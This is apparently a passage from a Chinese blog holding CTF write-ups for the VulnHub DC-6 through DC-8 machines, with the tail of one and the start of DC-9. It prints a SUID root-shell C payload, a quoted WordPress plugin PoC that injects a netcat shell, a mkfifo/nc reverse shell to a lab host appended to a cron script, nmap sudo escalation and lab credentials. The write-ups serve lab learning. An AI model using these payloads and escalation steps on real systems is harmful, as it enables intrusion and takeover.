<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// rootshell.c 文件内容：</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将两个文件编译，名字不能错！！！ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. gcc -fPIC -shared -ldl -o libhax.so libhax.c </span><br><span class="line">2. gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure></p>
<p>将编译完的文件传到靶机，直接执行 41154.sh 即可（有的writeup将41154.sh只保留最后的一部分，我尝试之后不行）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513112647.png" /></p>
<p>最后读取/root/thisistheflag.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">888b    888 d8b                                                      888      888 888 888 </span><br><span class="line">8888b   888 Y8P                                                      888      888 888 888 </span><br><span class="line">88888b  888                                                          888      888 888 888 </span><br><span class="line">888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 </span><br><span class="line">888 Y88b888 888 d88P&quot;   d8P  Y8b      888  888  888 d88&quot;&quot;88b 888P&quot;   888 .88P 888 888 888 </span><br><span class="line">888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P </span><br><span class="line">888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 &quot;88b  &quot;   &quot;   &quot;  </span><br><span class="line">888    Y888 888  &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot;  888     888  888 888 888 888 </span><br><span class="line">                                                                                          </span><br><span class="line">                                                                                          </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Once again, a big thanks to all those who do these little challenges,</span><br><span class="line">and especially all those who give me feedback - again, it&#x27;s all greatly</span><br><span class="line">appreciated.  :-)</span><br><span class="line"></span><br><span class="line">I also want to send a big thanks to all those who find the vulnerabilities</span><br><span class="line">and create the exploits that make these challenges possible.</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机难度适中，entry point确实比较难找。涉及以下攻击方法：</p>
<ol type="1">
<li>文件包含</li>
<li>包含日志</li>
<li>suid提权</li>
<li>exp代码修改</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>文件包含</tag>
        <tag>suid提权</tag>
        <tag>exp代码修改</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-6 Writeup</title>
    <url>/2022/05/13/DC-6%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度适中。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-6,315/">DC: 6 ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>提示：</p>
<ul>
<li><code>cat rockyou.txt | grep k01 &gt; passwords.txt</code></li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.41</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.41</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513141147.png" /></p>
<h2 id="信息收集">2.2. 信息收集</h2>
<p>根据扫描结果，需要将wordy加入/etc/hosts然后直接访问，主页面除了知道CMS是wordpress之外，没有任何信息。</p>
<p>解析来进行路径扫描，得到一个后台登录界面 /wp-admin，除此之外，没有任何收获。解析来枚举以下用户信息： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy/ --enumerate u </span><br></pre></td></tr></table></figure></p>
<p>得到如下用户信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">sarah</span><br><span class="line">graham</span><br><span class="line">mark</span><br><span class="line">jens</span><br></pre></td></tr></table></figure></p>
<p>最开始用小的字典爆破，结果没有任何结果，但是使用rockyou.txt又太大了。官网其实给了相关提示， <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat rockyou.txt | grep k01 &gt; passwords.txt # 官网提示</span><br><span class="line">wpscan --url http://wordy/ -U users.txt -P passwords.txt</span><br></pre></td></tr></table></figure></p>
<p>最后得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mark / helpdesk01</span><br></pre></td></tr></table></figure></p>
<p>进入后台，发现了这么一个东西，像是一个插件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513163453.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513163517.png" /></p>
<p>存在 RCE 漏洞。但是这里不要使用给的py文件，虽然可以直接get shell，但是后续操作的命令中一旦含有空格就会自动断开。</p>
<h2 id="get-shell">2.3. get shell</h2>
<p>查看 45274.html，看一下利用方式 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PoC:</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!--  Wordpress Plainview Activity Monitor RCE</span><br><span class="line">        [+] Version: 20161228 and possibly prior</span><br><span class="line">        [+] Description: Combine OS Commanding and CSRF to get reverse shell</span><br><span class="line">        [+] Author: LydA(c)ric LEFEBVRE</span><br><span class="line">        [+] CVE-ID: CVE-2018-15877</span><br><span class="line">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</span><br><span class="line">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well</span><br><span class="line">  --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;ip&quot; value=&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;lookup&quot; value=&quot;Lookup&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;  </span><br></pre></td></tr></table></figure></p>
<p>阅读之后，发现漏洞其实是在下图红框中</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513163731.png" /></p>
<p>但是，这里被限制了输入长度，因此先随便输入之后，点击 Lookup 并抓包，然后通过修改数据包来get shell</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513164652.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513164746.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>首先查看了 /etc/passwd，除了root之外还有四个用户：graham,mark,jens,sarah。</p>
<p>一一查看家目录，当查看到 mark 的时候，有一个stuff目录，里面有一个文件 things-to-do.txt，内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Things to do:</span><br><span class="line"></span><br><span class="line">- Restore full functionality for the hyperdrive (need to speak to Jens)</span><br><span class="line">- Buy present for Sarah&#x27;s farewell party</span><br><span class="line">- Add new user: graham - GSo7isUM1D4 - done</span><br><span class="line">- Apply for the OSCP course</span><br><span class="line">- Buy new laptop for Sarah&#x27;s replacement</span><br></pre></td></tr></table></figure></p>
<p>注意到，graham - GSo7isUM1D4 ，后面的字符串可能是密码，尝试切换用户。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513165030.png" /></p>
<p>拿到graham权限之后，查看 sudo -l</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513165107.png" /></p>
<p>查看该文件的权限</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513165133.png" /></p>
<p>文件的内容就两句话，看过去并没有用 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">tar -czf backups.tar.gz /var/www/html</span><br></pre></td></tr></table></figure></p>
<p><strong>但是，注意该文件的所有组是devs，而graham的所有组除了本身之外，还属于devs，意味着graham对该文件有写权限</strong>，因此 <code>echo "bash -i" &gt;&gt; /home/jens/backups.sh</code>，然后执行该文件：(注意指定用户) <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513165435.png" /></p>
<p>成功获得 jens 的权限。再次查看 sudo -l</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513165503.png" /></p>
<p>根据<a href="https://gtfobins.github.io/gtfobins/nmap/">nmap | GTFOBins</a>指出，可以依次执行下面命令进行提权： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. TF=$(mktemp) # 创建临时文件</span><br><span class="line">2. echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF</span><br><span class="line">3. sudo /usr/bin/nmap --script=$TF</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513170200.png" /></p>
<p>最后，读取/root/theflag.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b </span><br><span class="line"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机难度适中，除了密码爆破之外，虽然说没有提示也能爆破出来，但是估计要大半天。。。</p>
<p>涉及到的攻击方法：</p>
<ol type="1">
<li>wordpress插件漏洞利用</li>
<li>sudo提权</li>
<li>nmap提权</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>sudo提权</tag>
        <tag>密码爆破</tag>
        <tag>nmap提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-7 Writeup</title>
    <url>/2022/05/13/DC-7%20Writeup/</url>
    <content><![CDATA[<p>我个人感觉该靶机很难。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-7,356/">DC: 7 ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中 -&gt; 高</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.43</span><br><span class="line">3. sudo nmap -p22,80 -A 10.0.2.43</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513192654.png" /></p>
<p>收集的信息：</p>
<ol type="1">
<li>22端口为ssh</li>
<li>80端口为http</li>
<li>CMS为Drupal 8</li>
<li>存在robots.txt</li>
</ol>
<h2 id="信息收集-get-shell">2.2. 信息收集 + get shell</h2>
<p>主页面提示： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DC-7 introduces some &quot;new&quot; concepts, but I&#x27;ll leave you to figure out what they are.  :-)</span><br><span class="line"></span><br><span class="line">While this challenge isn&#x27;t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won&#x27;t succeed.</span><br><span class="line"></span><br><span class="line">What you will have to do, is to think &quot;outside&quot; the box.</span><br><span class="line"></span><br><span class="line">Way &quot;outside&quot; the box.  :-)</span><br></pre></td></tr></table></figure></p>
<p>又经过了路径扫描，弱口令尝试等都一无所获，除了下面的版本信息。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513194239.png" /></p>
<p>走投无路的时候注意到左下角</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513213715.png" /></p>
<p>通过搜索，找到对应的github，查看config.php，得到下面的信息，尝试后台登陆，发现失败了，尝试ssh登录，成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$servername = &quot;localhost&quot;;</span><br><span class="line">	$username = &quot;dc7user&quot;;</span><br><span class="line">	$password = &quot;MdR3xOgB7#dW&quot;;</span><br><span class="line">	$dbname = &quot;Staff&quot;;</span><br><span class="line">	$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513213956.png" /></p>
<h2 id="权限提升">2.3. 权限提升</h2>
<p>查看家目录下的mbox，发现了一个文件 /opt/scripts/backups.sh，权限如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513214109.png" /></p>
<p>内容如下： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line">cd /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br></pre></td></tr></table></figure></p>
<p>大致意思就是：先是将/var/www/html目录下的文件备份为/home/dc7user/backups/website.sql，然后再压缩为/home/dc7user/backups/website.tar.gz；接着生成两个加密的文件；然后修改/home/dc7user/baskups目录下的所有文件的权限；最后删除文件。</p>
<p>内容其实没什么用，但是mbox中的信息很耐人寻味，出现了cron，并且该文件也执行了许多次，猜测可能是root的一个定时任务。那么接下来的思路就是往backups.sh文件内写入反弹shell的命令，然后等待着被root执行。</p>
<p>问题来了，该文件只有root和www-data可以写，前者是我们的目标，因此，我们需要先切换到www-data</p>
<h3 id="get-www-data">2.3.1. get www-data</h3>
<p>（这部分不太懂，看大佬的writeup的）</p>
<p>漏洞利用点：</p>
<ul>
<li>PHP模块地址：https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</li>
<li>PHP模块漏洞：<a href="https://www.drupal.org/project/php">PHP | Drupal.org</a></li>
</ul>
<p>首先利用下面的命令修改admin的密码： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. cd /var/www/html</span><br><span class="line">2. drush user-password admin --password=&quot;123456&quot;</span><br></pre></td></tr></table></figure></p>
<p>然后后台登陆</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513214743.png" /></p>
<p>接着点击 Extend -&gt; Install new module</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513215129.png" /></p>
<p>添加PHP模块，然后install</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513215155.png" /></p>
<p>然后回到 Extend，将下面模块勾选，然后点击最后的 Install</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513215251.png" /></p>
<p>到这为止，准备工作ok，接着 Content -&gt; Add contetn -&gt; Basic page</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513215336.png" /></p>
<p><strong>在里面写入反弹shell的代码，最后将 Text format 改为 PHP code，最后点击 Preview</strong>。在这之前需要监听本地对应端口</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513215446.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513215538.png" /></p>
<p>成功得到 www-data 权限。</p>
<h3 id="get-root">2.3.2. get root</h3>
<p>接着，执行下面的命令，将反弹shell的命令写入backups.sh，注意端口！！！ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure></p>
<p>然后kali开启本地监听，需要等待大概3-5分钟，就会反弹shell</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220513215655.png" /></p>
<p>最后，读取/root/theflag.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and all those who have taken the time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">I&#x27;m sending out an especially big thanks to:</span><br><span class="line"></span><br><span class="line">@4nqr34z</span><br><span class="line">@D4mianWayne</span><br><span class="line">@0xmzfr</span><br><span class="line">@theart42</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机我个人感觉很难，第一是因为drupal没了解过，不知道drush以及相关的漏洞；第二就是get shell感觉思路确实挺 outside the box 的。</p>
<p>涉及的攻击方法如下：</p>
<ol type="1">
<li><strong>信息收集</strong></li>
<li>crontab提权</li>
<li>drupal的PHP模块漏洞</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>crontab提权</tag>
        <tag>drupal漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-8 Writeup</title>
    <url>/2022/05/14/DC-8%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度适中。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-8,367/">DC: 8 ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.44</span><br><span class="line">3. sudo nmap -p22,80 -A 10.0.2.44</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514143441.png" /></p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p>通过点击右侧的 Detail 中的信息（后三个是我后来测试功能点添加的，原先没有），网页没有任何变化，但是url出现了变化</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514143534.png" /></p>
<p>经过测试，发现存在SQL注入，并且是数字型，有回显</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514143643.png" /></p>
<p>直接丢到sqlmap中，爆破得到下面信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin : $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span><br><span class="line">john  : $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF</span><br></pre></td></tr></table></figure>
<p>将密码丢入 john 中破解，之破解了 john 的密码为 turtle。</p>
<p>利用该密码成功登录后台（通过路径扫描得到后台登录信息）</p>
<h1 id="get-shell">3. get shell</h1>
<p>没有常见的模板、主题、插件等提权点，并且文件上传也无法成功。就开始每个功能点测试，直到发现这么一个地方，很可疑</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514144023.png" /></p>
<p>经过测试发现，当我们在contact us 页面提交东西的时候，就会执行这里的 confirmation message</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514144137.png" /></p>
<p>如果这里是一段php反弹shell的代码，然后我们再次提交一次 contact us，按道理来说就会执行这段php代码，然后get shell。</p>
<p>说干就干，先从kali上拿到php反弹shell的代码，然后复制进去（不知道为什么，需要在第一行添加一行内容才可以）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514144356.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514144334.png" /></p>
<h1 id="权限提升">4. 权限提升</h1>
<p>再信息收集到suid文件的时候，发现了一个奇怪的文件 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514144618.png" /></p>
<p>搜索exim4的可利用漏洞</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514144824.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514144749.png" /></p>
<p>查看 46996.sh 的内容，发现有两种利用方式 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Usage (setuid method): ./raptor_exim_wiz -m setuid</span><br><span class="line">2. Usage (netcat method): ./raptor_exim_wiz -m netcat</span><br></pre></td></tr></table></figure></p>
<p>经尝试，第一种方法失败，第二种成功</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514145452.png" /></p>
<p>最后，读取/root/flag.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Brilliant - you have succeeded!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888</span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888</span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888</span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888</span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888</span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P</span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;</span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and all those who have taken the time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">I&#x27;m also sending out an especially big thanks to:</span><br><span class="line"></span><br><span class="line">@4nqr34z</span><br><span class="line">@D4mianWayne</span><br><span class="line">@0xmzfr</span><br><span class="line">@theart42</span><br><span class="line"></span><br><span class="line">This challenge was largely based on two things:</span><br><span class="line"></span><br><span class="line">1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.</span><br><span class="line">2. A suggestion from @theart42</span><br><span class="line"></span><br><span class="line">The answer to that question is...</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">5. 总结</h1>
<p>该靶机难度适中，涉及以下攻击方法：</p>
<ol type="1">
<li>drupal后台get shell</li>
<li>SQL注入</li>
<li>suid提权——exim漏洞</li>
</ol>
<p>唯一的难点在于get shell的点比较难找。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SQL注入</tag>
        <tag>drupal后台get shell</tag>
        <tag>suid提权——exim漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-9 Writeup</title>
    <url>/2022/05/14/DC-9%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-9,412/">DC: 9 ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>前置知识：</p>
<ul>
<li>端口敲门 (Port Knocking)</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.45</span><br><span class="line">3. sudo nmap -p22,80 -A 10.0.2.45</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514150308.png" /></p>
<p>这里注意，22 端口变成了 filtered，如果此时直接连接，比如输入以下命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@10.0.2.45</span><br></pre></td></tr></table></figure></p>
<p>会直接报错。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514192237.png" /></p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514190917.png" /></p>
<p>依次查看了菜单中的四个功能，Manage是一个登陆界面。Search是一个搜索框。除此之外，没有其他功能点。</p>
<p>首先在 Search 那进行检测，发现输入之后会转到 results.php，抓包测试以下是否存在SQL注入，还真有，为字符型的</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514191236.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514191256.png" /></p>
<p>将其丢入sqlmap中跑，得到两个数据库，将其中重要信息全部保存如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+--------+----------+--------------------------------------------------+</span><br><span class="line">| UserID | Username | Password                                         |</span><br><span class="line">+--------+----------+--------------------------------------------------+</span><br><span class="line">| 1      | admin    | 856f5de590ef37314e7c3bdf6f8a66dc (transorbital1) |</span><br><span class="line">+--------+----------+--------------------------------------------------+</span><br></pre></td></tr></table></figure>
<p>（直接利用sqlmap破解了密码）</p>
